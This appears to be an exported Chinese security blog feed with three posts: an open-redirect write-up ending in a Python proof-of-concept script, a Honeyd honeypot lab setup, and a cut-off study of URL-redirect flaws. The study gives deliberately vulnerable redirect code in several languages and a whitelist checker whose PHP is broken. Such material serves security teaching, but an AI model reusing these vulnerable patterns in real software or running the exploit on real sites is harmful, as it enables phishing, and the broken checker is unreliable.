<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p>
<p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
        <tag>python安全</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Honeyd搭建简易蜜罐</title>
    <url>/2018/11/20/%E5%88%A9%E7%94%A8Honeyd%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E8%9C%9C%E7%BD%90/</url>
    <content><![CDATA[<h2 id="一次实验课：利用honeyd搭建蜜罐"><a href="#一次实验课：利用honeyd搭建蜜罐" class="headerlink" title="一次实验课：利用honeyd搭建蜜罐"></a>一次实验课：利用honeyd搭建蜜罐</h2><h3 id="Honeyd相关依赖的安装"><a href="#Honeyd相关依赖的安装" class="headerlink" title="Honeyd相关依赖的安装"></a>Honeyd相关依赖的安装</h3><h4 id="安装g-gcc（对相关的一些依赖进行源码编译安装）"><a href="#安装g-gcc（对相关的一些依赖进行源码编译安装）" class="headerlink" title="安装g++ gcc（对相关的一些依赖进行源码编译安装）"></a>安装g++ gcc（对相关的一些依赖进行源码编译安装）</h4><p><code>sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542713989.95.png" alt></p>
<h4 id="安装Libevent-非同步事件通知的函数库"><a href="#安装Libevent-非同步事件通知的函数库" class="headerlink" title="安装Libevent(非同步事件通知的函数库)"></a>安装Libevent(非同步事件通知的函数库)</h4><p>通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714140.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714266.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714342.43.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714411.04.png" alt></p>
<h4 id="安装Libdnet-提供跨平台的网络相关的API函数库"><a href="#安装Libdnet-提供跨平台的网络相关的API函数库" class="headerlink" title="安装Libdnet(提供跨平台的网络相关的API函数库)"></a>安装Libdnet(提供跨平台的网络相关的API函数库)</h4><p>包括了ARP缓存，路由表查询，IP包及物理帧的传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714501.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714633.0.png" alt></p>
<h4 id="安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础"><a href="#安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础" class="headerlink" title="安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)"></a>安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf libpcap-1.7.3.tar.gz</span><br><span class="line">sudo tar -zxvf libpcap-1.5.3.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">#在Ubuntu下缺少 flex  bison 手动安装</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716679.98.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716838.58.png" alt></p>
<h4 id="安装ARPD（运行在与Honeyd相同的系统上）"><a href="#安装ARPD（运行在与Honeyd相同的系统上）" class="headerlink" title="安装ARPD（运行在与Honeyd相同的系统上）"></a>安装ARPD（运行在与Honeyd相同的系统上）</h4><p>是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf arpd-0.2.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717043.1.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717136.12.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717261.85.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717343.56.png" alt></p>
<h4 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&apos;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717614.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717760.42.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717808.49.png" alt></p>
<h4 id="检测arpd和honeyd是否可以运行"><a href="#检测arpd和honeyd是否可以运行" class="headerlink" title="检测arpd和honeyd是否可以运行"></a>检测arpd和honeyd是否可以运行</h4><h5 id="arpd"><a href="#arpd" class="headerlink" title="arpd"></a>arpd</h5><h5 id><a href="#" class="headerlink" title></a><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717918.17.png" alt></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#运行后显示链接不存在</span><br><span class="line">#解决：</span><br><span class="line">whereis  libevent-1.4.so.2</span><br><span class="line">#将libevent-1.4.so.2位置添加到/etc/ld.so.conf</span><br><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line">#重新加载链接</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718321.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718381.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718352.41.png" alt></p>
<h5 id="honeyd"><a href="#honeyd" class="headerlink" title="honeyd"></a>honeyd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">honeyd</span><br><span class="line">#报错：无法加载libdnet</span><br><span class="line">#解决：也是无法链接，但是这个缺少链接文件：</span><br><span class="line">whereis libdnet</span><br><span class="line">#生成链接</span><br><span class="line">sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1</span><br><span class="line">#重新加载</span><br><span class="line">sudo /sbin/ldconfig</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718573.78.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718977.76.png" alt></p>
<h3 id="简单的调试与测试"><a href="#简单的调试与测试" class="headerlink" title="简单的调试与测试"></a>简单的调试与测试</h3><ul>
<li><p>arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71  </p>
<p><code>sudo arpd -i ens33 192.168.1.71</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719524.81.png" alt></p>
</li>
<li><p>将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv config.sample ./honeyd.conf</span><br><span class="line">sudo vim honeyd.conf</span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line">#设置系统重启时间</span><br><span class="line">set windows uptime 1728650</span><br><span class="line">#设置最大文件描述符</span><br><span class="line">set windows maxfds 35</span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">#开启22，23端口</span><br><span class="line">add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;</span><br><span class="line">add windows tcp port 23 proxy $ipsrc:23</span><br><span class="line">#add template udp port 53 proxy 141.211.92.141:53</span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line">#开启135，139端口</span><br><span class="line">add windows tcp port 135 open</span><br><span class="line">add windows tcp port 139 open</span><br><span class="line"></span><br><span class="line">bind 192.168.1.71 windows</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719973.36.png" alt></p>
</li>
<li><p>启动honeyd </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo honeyd -d -f honeyd.conf  -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720601.46.png" alt></p>
</li>
<li><p>在同网段下ping，访问web服务</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720665.52.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720690.71.png" alt></p>
</li>
<li><p>蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720889.75.png" alt></p>
</li>
<li><p>蜜罐主机应用的web服务显示的脚本内容</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542721041.24.png" alt></p>
</li>
</ul>
<h3 id="实验思考题"><a href="#实验思考题" class="headerlink" title="实验思考题"></a>实验思考题</h3><p>如何利用Honeyd实现跨网段的模拟。</p>
<p>回答：</p>
<ol>
<li>可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。</li>
<li>可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。</li>
</ol>
<h3 id="实验中的问题"><a href="#实验中的问题" class="headerlink" title="实验中的问题"></a>实验中的问题</h3><ol>
<li>对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex  bison ，需要手动安装。</li>
<li>安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）" target="_blank" rel="noopener">https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）</a></p>
<p><a href="https://blog.csdn.net/accepthjp/article/details/46399715" target="_blank" rel="noopener">https://blog.csdn.net/accepthjp/article/details/46399715</a></p>
<p><a href="https://blog.csdn.net/LFGxiaogang/article/details/73287152" target="_blank" rel="noopener">https://blog.csdn.net/LFGxiaogang/article/details/73287152</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转学习总结</title>
    <url>/2018/11/12/URL%E8%B7%B3%E8%BD%AC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="URL跳转漏洞学习总结"><a href="#URL跳转漏洞学习总结" class="headerlink" title="URL跳转漏洞学习总结"></a>URL跳转漏洞学习总结</h2><h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。</p>
<h3 id="URL重定向（301-302）"><a href="#URL重定向（301-302）" class="headerlink" title="URL重定向（301/302）"></a>URL重定向（301/302）</h3><ol>
<li>301重定向：当域名或者网址永久弃用后，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302重定向：当域名或网址临时弃用时，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302URL劫持与302任意URL跳转的不同点<ul>
<li>302——URL劫持是由于搜素引擎的算法导致的问题。例如A网站暂时弃用，要302重定向到B网站，但是由于B网站URL太过复杂，而搜索引擎的算法判定A网址更加适合，所以爬取的还是A网址，这个时候访问网站是显示的URL是A网站的，而显示的内容是B网站的，造成了302重定向——URL劫持。</li>
<li>302——任意URL跳转是用户可以直接控制URL跳转的参数或者通过一些绕过方式控制URL跳转的位置造成的问题。</li>
</ul>
</li>
</ol>
<h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。</p>
<h4 id="漏洞出现的详细原因"><a href="#漏洞出现的详细原因" class="headerlink" title="漏洞出现的详细原因"></a>漏洞出现的详细原因</h4><ul>
<li>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞</li>
<li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li>
<li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li>
<li>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li>
<li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li>
</ul>
<h3 id="WEB站点中URL跳转漏洞的发生点"><a href="#WEB站点中URL跳转漏洞的发生点" class="headerlink" title="WEB站点中URL跳转漏洞的发生点"></a>WEB站点中URL跳转漏洞的发生点</h3><ul>
<li>用户登录、统一身份认证处、认证以后发生跳转</li>
<li>用户分享、收藏内容后会发生跳转</li>
<li>跨站点认证、在授权后会认证</li>
<li>站内对其他网站的链接，点击后会跳转</li>
</ul>
<h3 id="URL跳转的实现方式"><a href="#URL跳转的实现方式" class="headerlink" title="URL跳转的实现方式"></a>URL跳转的实现方式</h3><ul>
<li><p>通过META标签内跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"url"</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_REQUEST[<span class="string">"url"</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $url = <span class="string">"url_meta.php"</span>;</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"5; url=&lt;?php echo $url?&gt;"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529489.94.png" alt></p>
</li>
</ul>
</li>
<li><p>通过JavaScript跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	echo <span class="string">"&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"</span>;</span><br><span class="line">	exit;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529568.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529591.92.png" alt></p>
</li>
</ul>
</li>
<li><p>通过header头跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 <code>http://www.lsowl.xyz/aaa.php?url=http://www.eval.com</code> ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。</p>
</li>
<li><p>同时由于一些网站的安全策略，白名单中有 <code>http://www.lsowl.xyz/aaa.php</code> 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单）</p>
</li>
</ul>
</li>
</ul>
<p>通过GET或POST的方式接收将要跳转的URL，然后通过上面的几种方式中的一种来跳转到目标URL。由于用户的输入会进入META，JavaScript，http头，所以都可能发生相应的上下文漏洞，如XSS等，同时URL跳转功能的特点，会在浏览器将用户从可信的站点跳转到不可信的站点，如果用户的输入带有敏感信息会泄露给不可信的第三方。</p>
<h3 id="常见的发生URL跳转的参数名"><a href="#常见的发生URL跳转的参数名" class="headerlink" title="常见的发生URL跳转的参数名"></a>常见的发生URL跳转的参数名</h3><ul>
<li>redirect</li>
<li>redirect_to</li>
<li>redirect_url</li>
<li>url</li>
<li>jump</li>
<li>jump_to</li>
<li>target</li>
<li>to</li>
<li>link</li>
<li>linkto</li>
<li>domain</li>
</ul>
<h3 id="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"><a href="#几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）" class="headerlink" title="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"></a>几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）</h3><ul>
<li><p>Java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>.NET</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string redirect_url = request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Django</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">redirect_url = request.GET.get("url")</span></span><br><span class="line"><span class="xml">HttpResponseRedirect(redirect_url)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Flask</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_url = request.form[&apos;url&apos;]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Rails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网站后端对白名单限制（以PHP为例）"><a href="#网站后端对白名单限制（以PHP为例）" class="headerlink" title="网站后端对白名单限制（以PHP为例）"></a>网站后端对白名单限制（以PHP为例）</h3><ul>
<li><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// $allowedDomains 表示允许跳转的url白名单</span></span><br><span class="line">$allowedDomains = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"aaaa.com"</span></span><br><span class="line">        <span class="string">"bbbb.com"</span></span><br><span class="line">        .......</span><br><span class="line">    );</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeUrl</span><span class="params">($urlInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $path = <span class="keyword">isset</span>($urlInfo[<span class="string">'path'</span>]) ? $urlInfo[<span class="string">'path'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($path))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"/"</span>, $path);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $t[$i] = rawurlencode($t[$i]);             </span><br><span class="line">            &#125;</span><br><span class="line">            $path = implode(<span class="string">"/"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        $query = <span class="keyword">isset</span>($urlInfo[<span class="string">'query'</span>]) ? $urlInfo[<span class="string">'query'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"&amp;"</span>, $query);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $tt = explode(<span class="string">"="</span>, $t[$i]);</span><br><span class="line">                $tt[<span class="number">1</span>] = rawurlencode($tt[<span class="number">1</span>]);</span><br><span class="line">                $t[$i] = implode(<span class="string">"="</span>, $tt);            </span><br><span class="line">            &#125;</span><br><span class="line">            $query = implode(<span class="string">"&amp;"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($urlInfo[<span class="string">'host'</span>]) || <span class="keyword">empty</span>($urlInfo[<span class="string">'host'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $path. <span class="string">"?"</span>. $query;</span><br><span class="line">        &#125;</span><br><span class="line">        $scheme = <span class="keyword">isset</span>($urlInfo[<span class="string">'scheme'</span>]) ? $urlInfo[<span class="string">'scheme'</span>] : <span class="string">'http'</span>;</span><br><span class="line">        $port = <span class="keyword">isset</span>($urlInfo[<span class="string">'port'</span>]) ? $urlInfo[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">        $request = $scheme . <span class="string">'://'</span>. $urlInfo[<span class="string">'host'</span>];</span><br><span class="line">        $request .= ($port == <span class="number">80</span>) ? <span class="string">''</span> : <span class="string">':'</span>.$port;</span><br><span class="line">        $request .= $path;</span><br><span class="line">        $request .= (<span class="keyword">empty</span>($query)) ? <span class="string">''</span> : <span class="string">'?'</span>.$query;</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">($url,$domainArr=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $res = <span class="keyword">array</span>(<span class="string">'isTrustedDomain'</span> =&gt; <span class="keyword">false</span>,<span class="string">'url'</span> =&gt; <span class="string">''</span>,<span class="string">'domain'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url))     <span class="keyword">return</span> $res;</span><br><span class="line">        $domainArr = <span class="keyword">empty</span>($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr;</span><br><span class="line">        $url      = filterUrl($url);<span class="comment">//先过滤特殊字符</span></span><br><span class="line">        $p      = parse_url($url);</span><br><span class="line">        $scheme = $p[<span class="string">'scheme'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!in_array(strtolower($scheme),<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        $host   = $p[<span class="string">'host'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!isValidHost($host))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        